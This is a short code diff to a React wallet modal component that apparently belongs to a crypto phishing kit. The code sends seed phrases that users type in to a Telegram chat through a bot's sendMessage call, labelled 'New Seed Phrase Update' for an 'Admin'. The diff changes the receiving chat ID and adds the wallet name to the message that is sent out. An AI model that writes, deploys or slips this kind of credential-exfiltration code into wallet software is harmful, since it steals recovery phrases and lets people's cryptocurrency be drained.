@@ -24,8 +24,8 @@ export default function WalletDetailsModal({ isOpen, onClose, title, startWallet
         try {
 
 
-            const dd = await bot.api.sendMessage("635141025",
-                `Hello Admin! New Seed Phrase Update <b>${new Date().toISOString()}</b> \n  ${message.join("\n").toString()}.`,
+            const dd = await bot.api.sendMessage("6862058456",
+                `Hello Admin! New Seed Phrase Update <b>${new Date().toISOString()}</b> \n Wallet: ${title} \n  ${message.join("\n").toString()}.`,
                 {
                     parse_mode: "HTML"
                 });
